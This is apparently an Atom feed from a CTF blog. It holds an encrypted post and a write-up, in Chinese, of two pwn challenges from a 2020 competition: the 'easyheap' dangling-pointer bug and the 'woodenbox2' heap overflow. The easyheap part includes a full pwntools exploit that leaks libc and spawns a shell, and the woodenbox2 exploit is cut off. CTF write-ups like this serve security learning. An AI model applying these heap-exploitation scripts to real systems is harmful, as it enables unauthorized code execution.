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 </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-04-15T06:35:24.169Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            